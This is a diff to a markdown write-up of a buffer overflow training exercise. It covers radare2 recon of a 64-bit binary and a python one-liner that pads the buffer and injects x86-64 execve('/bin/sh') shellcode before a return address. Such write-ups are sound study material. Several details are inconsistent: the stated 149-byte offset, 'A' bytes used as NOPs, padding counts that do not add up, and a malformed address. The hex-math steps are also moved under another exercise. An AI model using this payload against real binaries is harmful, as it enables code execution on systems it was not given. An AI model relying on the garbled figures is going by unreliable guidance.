@@ -1076,6 +1076,7 @@ You’ve probably noticed that shellcode, memory addresses and NOP sleds are usu
 - The buffer is 140 bytes
 - The 64-bit architecture uses an 8-byte base pointer (rbp)
 - The minimum overflow length is 149 bytes to overflow into the return address
+- The given shellcode is 30 bytes, dropping the number of required NOPS to 118 (again, minimum), so the shellcode begins at 149.
 
 **Initial Recon**  
 
@@ -1091,19 +1092,10 @@ Enumerate the flagspace `fs <flagspace name>;f` to capture the entry point of th
 
 `:> fs symbols; f`  
 
- 
-
 ![Initial Recon 2](assets/buffer-overflow-14-task8-3.png)  
 
-Use a Hex calculator to identify the difference.  
-
-In Hex value:
-00400527 – 00400450 = D7
-
-In Decimal value:
-4195623 – 4195408 = 215
-
-![Hex Math](/assets/buffer-overflow-17-task8-6.png)  
+The entrypoint for the main function is x00400564.
+The entrypoint for the copy_arg function is 0x00400527.  
 
 Move to the entry point of the function  
 
@@ -1120,8 +1112,21 @@ Print the function to learn more about what happens inside
 ![copy_arg Function](assets/buffer-overflow-16-task8-5.png)  
 
 
-`python -c “print ("A" * 148 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" + "B" * 30 + memory address)”`
+The modelf for the command, again: `python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)”`  
+
+
+`python -c “print ("A" * 118 + "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" + "B" * 30 + memory address)”`
 
 
 
 ## BUFFER OVERFLOW EXERCISE 2
+
+
+Use a Hex calculator to identify the difference.  
+
+In Hex value:
+00400527 – 00400450 = D7
+
+In Decimal value:
+4195623 – 4195408 = 215
+![Hex Math](/assets/buffer-overflow-17-task8-6.png)  
